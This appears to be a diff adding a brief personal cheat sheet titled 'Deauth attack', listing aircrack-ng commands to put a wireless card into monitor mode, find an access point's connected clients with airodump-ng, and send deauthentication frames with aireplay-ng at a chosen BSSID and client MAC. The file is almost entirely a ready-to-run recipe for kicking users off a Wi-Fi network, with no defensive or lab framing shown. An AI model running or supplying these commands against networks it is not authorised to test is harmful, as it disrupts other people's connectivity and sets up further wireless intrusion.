@@ -1,0 +1,21 @@
+#################
+# Deauth attack #
+#################
+
+iwcofig : list all wireless interfaces
+iw list : look for section labeled "Supported interface modes"
+airmon-ng : used to change managed to monitor
+            
+        managed to monitor : airmon-ng check kill
+                             airmon-ng start <interface name>
+        
+        monitor to managed : airmon-ng stop <interface name>
+                             systemctl restart NetworkManager
+
+airodump-ng : used to get connected clients and more
+              airodump-ng -d "AP BSSID" --band a wlan0mon
+
+aireplay-ng : used to deauth attack
+              aireplay-ng --deauth 10 -a <AP BSSID> -c <client mac> -D wlan0mon
+
+
